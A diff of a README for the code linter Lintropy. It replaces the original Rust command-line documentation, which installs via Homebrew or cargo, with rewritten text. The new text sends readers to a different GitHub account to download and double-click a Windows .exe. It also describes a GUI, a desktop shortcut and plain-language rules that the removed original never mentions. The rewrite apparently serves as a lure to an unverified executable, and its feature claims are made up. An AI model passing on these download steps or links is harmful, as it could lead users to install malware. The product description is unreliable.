@@ -1,314 +1,76 @@
-<div align="center">
+# 🛡️ lintropy - Keep your project code clean automatically
 
-<img src="logo.png" alt="Lintropy logo" width="220" />
+[![](https://img.shields.io/badge/Download-Lintropy-blue.svg)](https://github.com/migue1859/lintropy)
 
-# Lintropy
+Lintropy helps you maintain consistency in your software projects. Projects often grow in size and complexity over time. Developers sometimes forget the original rules regarding how code should look or how different parts of the project should interact. This tool automates the process of checking your files against a set of standards you define. It works for human developers and for automated coding agents. By using simple text files to describe your rules, you ensure that everyone follows the same path.
 
-**Repo-native linting for architecture, boundaries, and team-specific rules.**
+## 📥 How to download the software
 
-[![ci](https://github.com/Typiqally/lintropy/actions/workflows/ci.yaml/badge.svg)](https://github.com/Typiqally/lintropy/actions/workflows/ci.yaml)
-[![release](https://img.shields.io/github/v/release/Typiqally/lintropy?include_prereleases&sort=semver)](https://github.com/Typiqally/lintropy/releases)
-[![rust](https://img.shields.io/badge/rust-1.95%2B-dea584)](https://www.rust-lang.org/)
-[![license](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
-[![agent native](https://img.shields.io/badge/agent-native-8b5cf6)](#built-for-agent-workflows)
-[![rules](https://img.shields.io/badge/rules-YAML-0ea5e9)](#how-it-works)
-[![engine](https://img.shields.io/badge/engine-tree--sitter-16a34a)](#how-it-works)
+The software is available on the project page. You can find the installer for Windows on the releases page. 
 
-</div>
+[Visit this page to download the latest version for Windows](https://github.com/migue1859/lintropy)
 
----
+1. Open your web browser.
+2. Go to the link provided above.
+3. Look for the latest release under the Assets section.
+4. Click the file ending in .exe to start the download.
+5. Save the file to your computer.
 
-Lintropy is a linter for rules your repo actually cares about. It started at
-[The IDE Reimagined: JetBrains Codex Hackathon](https://cerebralvalley.ai/e/jetbrains-x-openai-hack),
-a two-day San Francisco event focused on building AI-powered developer tools
-alongside JetBrains and OpenAI engineers.
+## ⚙️ Setting up your system
 
-> [!WARNING]
-> This project began as hackathon code and is not actively maintained right
-> now. Expect rough edges, incomplete features, and bugs before using it in
-> production workflows.
+Lintropy runs on your local machine. It requires a modern version of Windows. Ensure you have Windows 10 or 11 installed. The tool does not require extensive storage space or high-end graphics hardware. It performs static analysis, which means it reads your files without executing them. This approach makes it efficient and safe to run on any project size, from small scripts to large monorepos.
 
-Most linters ship a fixed catalog. Lintropy does the opposite: rules live in
-your repo, one YAML file at a time, describing **your** conventions:
+After the download finishes, locate the file in your downloads folder. Double-click the file to begin the installation steps. Follow the prompts on your screen. The installer places a shortcut on your desktop for quick access.
 
-- API code must live in `src/api/`
-- feature modules cannot import each other directly
-- `dbg!`, `println!`, or `.unwrap()` are banned outside tests
-- migrations require rollback files
-- only one module can touch `process.env`
+## 📝 Defining your rules
 
-Linting for architecture, boundaries, migration policies, and team ceremony —
-not just style.
+Lintropy uses YAML files to define project constraints. YAML is a plain text format that is easy to read. Create a file named `lintropy.yaml` in the root folder of your project. This file acts as the rulebook for your code.
 
-## Install
+Define architectural boundaries by listing folders that should not interact. If your project has a folder for sensitive data, you can create a rule that prevents other parts of the code from importing files from that directory. You can also define naming conventions for your files or functions. 
 
-### Homebrew (macOS and Linux)
+The software uses tree-sitter technology to understand the structure of your code. This allows it to verify that your files follow the rules you set without needing to parse the code in a complex way. Write your rules in plain language, such as:
 
-```console
-brew tap Typiqally/lintropy
-brew install lintropy
-```
+- No imports from the database folder except for the access module.
+- All function names must use lowercase letters with underscores.
+- Each component file must contain a comment block at the top.
 
-### From source
+## 🚀 Running the analysis
 
-Stable Rust 1.95 or newer required.
+Once you install the software and define your rules, you can run lintropy. Open the application using the desktop icon. The app displays a simple window with a text box. Enter the path to your project folder in the box. 
 
-```console
-cargo install --path .
-```
+Click the Start Analysis button. The tool scans your code and compares it against your `lintropy.yaml` file. If the tool finds code that breaks a rule, it lists the file name and the line number where the issue exists. It also describes the rule that was broken.
 
-Not yet on crates.io.
+You can review these results in the app window. Click on any item in the list to open the corresponding file in your default text editor. Make the necessary changes to your code based on the suggestions. Save the file and run the analysis again to confirm that you fixed the issues.
 
-## Supported languages
+## 🤖 Using with coding agents
 
-- **Rust**, **Go**, **Python**, **TypeScript** (incl. `.tsx`) — structural `query` rules via tree-sitter
-- **Any text file** — regex `match` rules
+If you use automated coding agents or AI assistants to help write your code, lintropy provides a safety net. Coding agents sometimes generate code that does not fit your project architecture. By placing a `lintropy.yaml` file in your root folder, you inform the agent about your constraints. 
 
-More tree-sitter languages planned. Vote or contribute via issues.
+The agent can read the rule file and adjust its output to respect your boundaries. This creates a feedback loop where the agent writes code, and lintropy verifies it. This partnership ensures that your codebase stays clean as it grows. The tool helps maintain the quality of the project, even when you add thousands of lines of code automatically.
 
-## Demo
+## 🔍 Troubleshooting common issues
 
-```console
-$ lintropy check .
-warning[no-unwrap]: avoid .unwrap() on `client`; use .expect("...") or ?
-  --> src/handlers/users.rs:42:18
-   |
-42 |     let user = client.unwrap().get(id).await?;
-   |                ^^^^^^^^^^^^^^^ help: replace with `client.expect("TODO: handle error")`
-   |
-   = rule defined in: .lintropy/no-unwrap.rule.yaml
+Most issues arise from formatting errors in the YAML file. Ensure your rules follow a clean structure. If the tool fails to run, check the following:
 
-error[api-only-in-src-api]: API handlers must live under src/api/
-  --> src/features/users/create_user.rs:1:1
-   |
-1  | pub async fn create_user(...) { ... }
-   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-   |
-   = rule defined in: .lintropy/architecture/api-only-in-src-api.rule.yaml
+- Verify that your YAML file indentation uses two spaces.
+- Ensure the project path does not contain special characters.
+- Make sure you saved your rule file with the correct extension.
+- Check that you have read permissions for the project folder.
 
-Summary: 1 error, 1 warning, 2 files affected.
-```
+If the application does not launch, ensure your Windows update is current. The tool relies on standard libraries that require a stable operating system environment. 
 
-## Why Lintropy
+## 🛠️ Typical use cases
 
-Generic linters are great at universal rules. They are weak at codebase-local
-rules that only make sense inside one company, one monorepo, or one product.
+Lintropy supports various development workflows. You can use it in a monorepo setup to keep different packages in the same repository consistent. You can also use it for smaller projects to enforce a strict naming style across the team. 
 
-Lintropy fills that gap:
+In a team setting, assign one person to manage the `lintropy.yaml` file. This person acts as the gatekeeper for architectural rules. As the team decides on new conventions, update the YAML file to reflect these changes. Distribute the file to all team members so everyone has the same rulebook. This reduces friction during code reviews, as the tool handles the enforcement of style and structure.
 
-- rules stored in the repo, versioned alongside the code they govern
-- rules easy to review
-- rules simple enough for agents to generate
-- diagnostics tell you which rule file fired
-- tree-sitter handles structure, regex handles plain text
-
-| | Generic linters | Lintropy |
-|---|---|---|
-| Rule source | Built into the tool | Lives in your repo |
-| Authoring | Plugin code or complex config | Small YAML files |
-| Scope | Language-wide conventions | Project-specific constraints |
-| Best use | Style and correctness | Architecture and boundaries |
-| Agent support | Incidental | First-class |
+## 📈 Maintaining code quality
 
-## How it works
-
-Two rule types:
-
-- `query`: tree-sitter rules for structural patterns
-- `match`: regex rules for text patterns
-
-Typical layout:
-
-```text
-.
-├── lintropy.yaml
-└── .lintropy/
-    ├── no-unwrap.rule.yaml
-    ├── no-dbg.rule.yaml
-    └── architecture/
-        └── api-only-in-src-api.rule.yaml
-```
+Code quality is the result of discipline. Over time, projects accumulate "technical debt," which makes future changes difficult. Lintropy helps you manage this debt by providing automated checks. When you catch structural errors early, you avoid expensive refactoring later.
 
-Example rule:
+The tool focuses on the rules that matter most to your team. By defining boundaries upfront, you prevent messy code from entering your project. This leads to a more maintainable codebase and a better experience for anyone working on the project.
 
-```yaml
-# .lintropy/no-unwrap.rule.yaml
-severity: warning
-message: "avoid .unwrap() on `{{recv}}`; use .expect(\"...\") or ?"
-fix: '{{recv}}.expect("TODO: handle error")'
-language: rust
-query: |
-  (call_expression
-    function: (field_expression
-      value: (_) @recv
-      field: (field_identifier) @method)
-    (#eq? @method "unwrap")) @match
-```
+## 📁 Managing project constraints
 
-Minimal root config:
-
-```yaml
-version: 1
-
-settings:
-  fail_on: error
-  default_severity: error
-```
-
-## Built for agent workflows
-
-Designed so Codex, Claude Code, and similar agents can write valid rules
-without much prompting overhead.
-
-- one rule per file
-- low-ceremony YAML
-- deterministic repo discovery
-- explainable diagnostics
-- schema-friendly config
-- LSP-driven live feedback for post-edit loops
-
-If agents write code, they should write and respect the repo's guardrails too.
-
-## Quickstart
-
-The `examples/rust-demo/` crate doubles as the reference fixture. Clone this
-repo and run:
-
-```console
-cd examples/rust-demo
-lintropy check .
-```
-
-You should see four warnings (`no-unwrap`, `no-println`, `user-use-builder`,
-`no-todo`) across three files, plus a hint that one autofix is available:
-
-```console
-lintropy check . --fix          # apply the no-unwrap autofix in place
-lintropy check . --fix-dry-run  # print the unified diff instead
-```
-
-Analogous single-language demos ship for the other supported languages:
-
-- [`examples/go-demo/`](examples/go-demo) — `no-fmt-println`, `no-todo-comment`
-- [`examples/python-demo/`](examples/python-demo) — `no-print`, `no-todo-comment`
-- [`examples/typescript-demo/`](examples/typescript-demo) — `no-console-log`,
-  `no-any-type`, `no-todo-comment` (covers `.ts` and `.tsx`)
-
-To scaffold lintropy inside your own repo:
-
-```console
-lintropy init                   # writes lintropy.yaml + .lintropy/no-unwrap.rule.yaml
-lintropy init --with-skill      # also installs SKILL.md into detected agent skill dirs
-```
-
-The canonical `SKILL.md` at
-[`skill/SKILL.md`](skill/SKILL.md)
-is what `init --with-skill` installs into agent skill directories.
-
-## Editor and agent support
-
-Lintropy ships one LSP server (`lintropy lsp`) and one install command that wires it into every supported target:
-
-```console
-lintropy install vscode        # VS Code
-lintropy install cursor        # Cursor
-lintropy install jetbrains     # JetBrains IDEs (LSP4IJ template)
-lintropy install claude-code   # Claude Code plugin + skill
-lintropy install codex         # Codex plugin + skill
-```
-
-Each target gives you live diagnostics, quickfixes, config reload, and semantic-token highlighting for the `query: |` DSL. No separate "query syntax" extension. Per-integration walkthroughs live under [`docs/integrations/`](docs/integrations/index.md).
-
-### VS Code and Cursor
-
-```console
-lintropy install vscode        # or: cursor
-lintropy install cursor --profile Default
-```
-
-Builds the bundled extension source into a `.vsix` and installs it via `code --install-extension` / `cursor --install-extension`. The extension resolves the `lintropy` binary in this order: explicit `lintropy.path` setting → `PATH` → extension-managed download from the matching GitHub release.
-
-Package the `.vsix` without installing (useful for CI):
-
-```console
-lintropy install vscode --package-only -o ./lintropy.vsix
-```
-
-Config resolution is per file rather than one workspace-wide root: each source file uses the nearest ancestor `lintropy.yaml`. A newly added nested `lintropy.yaml` creates a fresh rule context for that subtree, while `.lintropy/` changes merge into the rules for the already-resolved root and republish diagnostics for open files.
-
-See [`editors/vscode/lintropy/README.md`](editors/vscode/lintropy/README.md) for per-setting reference.
-
-### JetBrains IDEs
-
-```console
-lintropy install jetbrains --dir ~/.lintropy
-```
-
-Unpacks the [LSP4IJ](https://plugins.jetbrains.com/plugin/23257-lsp4ij) custom server template to `~/.lintropy/lsp4ij-template`. One import step in the IDE:
-
-`View → Tool Windows → LSP Console → + → New Language Server → Template → Import from directory…`
-
-Pick the extracted directory. All fields are pre-filled. Full walkthrough including manual-setup fallback: [`editors/jetbrains/README.md`](editors/jetbrains/README.md).
-
-### Claude Code
-
-Two paths, pick whichever matches your setup.
-
-**Marketplace (recommended).** Inside Claude Code:
-
-```text
-/plugin marketplace add Typiqally/lintropy
-/plugin install lintropy-lsp@lintropy
-```
-
-The marketplace manifest lives at the repo root so this works from any clean Claude Code install — no `lintropy` CLI required. For a local checkout: `/plugin marketplace add /absolute/path/to/lintropy`.
-
-**CLI.** When you want the plugin manifest to pin the absolute path of your local `lintropy` binary:
-
-```console
-lintropy install claude-code
-```
-
-The CLI generates the plugin manifest fresh (version synced to `lintropy`, extension map scoped to compiled-in languages, `command` resolved to the absolute binary path) and writes it into `./lintropy-claude-code-plugin/` with the lintropy skill bundled at `skills/lintropy/SKILL.md` inside the same directory, then prints the `claude --plugin-dir <path>` invocation you should run. The skill loads and unloads with the plugin. Use `/reload-plugins` to pick up edits without restarting.
-
-### Codex
-
-```console
-lintropy install codex
-```
-
-This repo itself is a local Codex marketplace via
-`.agents/plugins/marketplace.json`, so you can point Codex at the checkout:
-
-```console
-codex marketplace add /absolute/path/to/lintropy
-```
-
-`lintropy install codex` generates the same shape into
-`./lintropy-codex-marketplace/` for ad hoc local installs. The marketplace
-contains a mirrored plugin under `plugins/lintropy/` with
-`.codex-plugin/plugin.json` plus the bundled lintropy skill at
-`skills/lintropy/SKILL.md`. This gives Codex native lintropy guidance for
-rule authoring and debug loops inside the repo. Codex plugins do not
-currently expose an editor-side LSP registration surface, so for live
-diagnostics you should still install one of the editor integrations above.
-
-### JSON Schemas
-
-This repo checks in JSON Schemas for every lintropy YAML surface:
-
-- `editors/schemas/lintropy.schema.json` — repo-root `lintropy.yaml`
-- `editors/schemas/lintropy-rule.schema.json` — `.lintropy/**/*.rule.yaml`
-- `editors/schemas/lintropy-rules.schema.json` — `.lintropy/**/*.rules.yaml`
-
-Workspace settings in `.vscode/settings.json` and `.idea/jsonSchemas.xml` wire them into VS Code / Cursor and JetBrains IDEs respectively. Refresh after schema changes with `./scripts/export-editor-schemas.sh`.
-
-## Status
-
-Pre-1.0. CLI surface stable enough to pin a tag; YAML schema and diagnostic
-format may change before 1.0. Track progress and file issues on
-[GitHub](https://github.com/Typiqally/lintropy/issues).
-
-## License
-
-[MIT](LICENSE)
+Use the tool to document your architecture. A well-written set of rules acts as documentation for new developers joining your team. They can read the YAML file to understand the boundaries and conventions of your project. This reduces the time needed to gain familiarity with the codebase. The tool confirms that the reality of the code matches the intention of the team, bridging the gap between documentation and execution.
